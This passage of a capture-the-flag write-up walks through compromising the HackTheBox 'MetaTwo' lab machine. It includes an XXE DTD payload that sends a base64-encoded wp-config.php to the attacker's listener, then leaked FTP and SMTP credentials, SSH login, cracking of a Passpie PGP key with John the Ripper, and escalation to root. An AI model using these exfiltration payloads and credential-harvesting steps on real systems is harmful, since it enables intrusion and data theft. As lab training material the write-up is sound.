list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

Once, I knew the exploit was running properly, I decided to retrieve the contents of `wp-config.php` file.

The changes in the `evil.dtd` file are:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.27:8888/?p=%file;'>" >
```

Re-uploading the `payload.wav` file, I get back a response and decoding it

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ cat b64-decode-wp-config.txt 
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Here, I got back ftp credentials `metapress.htb:9NYS_ii@FyL_p5M2NvJ`

Using these credentials, I was able to log into the ftp server where there were two directories, `blog` & `mailer`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ ftp metapress.htb                                                                   
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (metapress.htb:darshan): metapress.htb
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7571|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
```

On Further enumeration, I found `send_email.php` inside `mailer` directory.

```
ftp> cd mailer
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||24755|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
ftp> wget send_email.php
?Invalid command.
ftp> mget send_email.php
mget send_email.php [anpqy?]? y
229 Entering Extended Passive Mode (|||34699|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |******************************************************************************************************************************************************************************************************************|  1126       20.65 MiB/s    00:00 ETA226 Transfer complete
1126 bytes received in 00:00 (8.84 KiB/s)
```

Viewing the contents of `send_mail.php`, I found user credentials.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ cat send_email.php                         
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

So, I decided to use these credentials to login through ssh.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ ssh jnelson@metapress.htb             
The authenticity of host 'metapress.htb (10.10.11.186)' can't be established.
ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'metapress.htb' (ED25519) to the list of known hosts.
jnelson@metapress.htb's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 14 19:37:30 2023 from 10.10.14.38
jnelson@meta2:~$ whoami
jnelson
```

Grabbing the user flag.

```
jnelson@meta2:~$ ls
linpeas.sh  pass  user.txt
jnelson@meta2:~$ cat user.txt 
[REDACTED]
```

## Privilege Escalation
Now, to escalate my privileges, I ran `sudo -l`, but the user nelson wasnt allowed to run sudo on the machine.

```
```

So, next, I listed the files in the user's directory and found two interesting files: `linpeas.sh` and `.passpie`

I googled what `passpie` is and found out that, Passpie is a command line tool to manage passwords from the terminal with a colorful and configurable interface.

So, you can just run passpie.

```
jnelson@meta2:~$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛

```

The password for ssh is stored but is encrypted with a passphrase and the private key for the ssh key is stored in the `.key` files as it encrypts the ssh key.



```
jnelson@meta2:~$ cd .passpie/
jnelson@meta2:~/.passpie$ ls
ssh
jnelson@meta2:~/.passpie$  ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 5 jnelson jnelson 4096 Feb 14 19:56 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
```

So, now, I jsut decided to copy the private key block from the `.keys` file.

```
jnelson@meta2:~/.passpie$ cat .keys
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
..[snip]...
GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+Po3KGdNgA/04lhPjdN3wrzjU3qmrL
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
...[snip]...
uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J
-----END PGP PRIVATE KEY BLOCK-----

```

Then I used, gpg2john and john the ripper to extract and crack the password from the private key.


```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ echo -en '-----BEGIN PGP PRIVATE KEY BLOCK-----                                                                                                                                                        

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
...[snip]...
o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----' > hash-key
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ gpg2john hash-key > crackthehash

File hash-key
                                                                                
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crackthehash         
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]         (Passpie)     
1g 0:00:00:05 DONE (2023-02-15 14:56) 0.1956g/s 32.09p/s 32.09c/s 32.09C/s peanut..blink182
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Then, after getting passie password manager's password, I tried to export the file by entering the recently cracked password.

```
jnelson@meta2:~/.passpie$ cd ..
jnelson@meta2:~$ ls
linpeas.sh  pass  user.txt
jnelson@meta2:~$ ls -la
total 848
drwxr-xr-x 5 jnelson jnelson   4096 Feb 14 19:56 .
drwxr-xr-x 3 root    root      4096 Oct  5 15:12 ..
lrwxrwxrwx 1 root    root         9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson    220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson   3526 Jun 26  2022 .bashrc
drwx------ 3 jnelson jnelson   4096 Feb 14 19:48 .gnupg
-rwxr-xr-x 1 jnelson jnelson 825665 Sep  4 05:54 linpeas.sh
drwxr-xr-x 3 jnelson jnelson   4096 Oct 25 12:51 .local
-rw-r--r-- 1 jnelson jnelson    347 Feb 14 19:56 pass
dr-xr-x--- 3 jnelson jnelson   4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson    807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson     33 Feb 14 17:37 user.txt
jnelson@meta2:~$ passpie export output.txt
Passphrase: 
jnelson@meta2:~$ ls
linpeas.sh  output.txt  pass  user.txt
jnelson@meta2:~$ cat output.txt
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode '[REDACTED]'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

Here, I got the root's password and I was able to login as a root user.

```
jnelson@meta2:~$ su root
Password: 
root@meta2:/home/jnelson# whoami
root
```


Grabbing the root flag.

```
root@meta2:/home/jnelson# cat /root/root.txt
[REDACTED]
```
